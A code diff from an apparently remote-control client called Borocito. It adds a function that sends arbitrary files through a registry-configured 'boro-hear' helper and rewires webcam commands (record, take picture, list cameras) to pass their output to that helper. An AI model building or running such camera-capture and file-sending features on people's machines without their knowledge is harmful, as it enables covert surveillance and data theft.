@@ -30,7 +30,9 @@ Module Utility
             Return "[AddToLog@Utility]Error: " & ex.Message
         End Try
     End Function
-    Function BoroHearInterop(Optional ByVal content As String = Nothing) As Boolean
+End Module
+Module Boro_Hear
+    Function BoroHearSendContent(Optional ByVal content As String = Nothing) As Boolean
         Try
             Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get\\boro-hear", True)
             If regKey Is Nothing Then
@@ -38,7 +40,7 @@ Module Utility
             Else
                 Try
                     If content <> Nothing Then
-                        AddToLog("BoroHearInterop", content, False)
+                        AddToLog("BoroHearSendContent", content, False)
                         Process.Start(regKey.GetValue("boro-hear"), content)
                     End If
                     Return True
@@ -47,7 +49,28 @@ Module Utility
                 End Try
             End If
         Catch ex As Exception
-            Console.WriteLine("[BoroHearInterop@Init]Error: " & ex.Message)
+            Console.WriteLine("[BoroHearSendContent@Init]Error: " & ex.Message)
+            Return False
+        End Try
+    End Function
+    Function BoroHearSendFile(Optional ByVal filePath As String = Nothing) As Boolean
+        Try
+            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get\\boro-hear", True)
+            If regKey Is Nothing Then
+                Return False
+            Else
+                Try
+                    If filePath <> Nothing Then
+                        AddToLog("BoroHearSendFile", filePath, False)
+                        Process.Start(regKey.GetValue("boro-hear"), "/filesend " & filePath)
+                    End If
+                    Return True
+                Catch
+                    Return False
+                End Try
+            End If
+        Catch ex As Exception
+            Console.WriteLine("[BoroHearSendFile@Init]Error: " & ex.Message)
             Return False
         End Try
     End Function
@@ -131,7 +154,7 @@ Module StartUp
 
                 ElseIf parameter.ToLower Like "*/startcamrecording*" Then
                     'Comienza a grabar la camara
-                    BoroHearInterop(Main.StartCamRecord())
+                    BoroHearSendContent(Main.StartCamRecord())
                 ElseIf parameter.ToLower Like "*/stopcamrecording*" Then
                     'Detiene la grabacion de la camara
                     Main.StopCamRecord()
@@ -141,9 +164,9 @@ Module StartUp
                     End
 
                 ElseIf parameter.ToLower Like "*/camera*" Then
-                    BoroHearInterop(Main.CameraManager(args(1)))
+                    BoroHearSendContent(Main.CameraManager(args(1)))
                 ElseIf parameter.ToLower Like "*/getcameras*" Then
-                    BoroHearInterop(Main.GetCameras())
+                    BoroHearSendContent(Main.GetCameras())
 
                 ElseIf parameter.ToLower Like "*/takecampicture*" Then
                     'Toma una captura de la camara y la envia
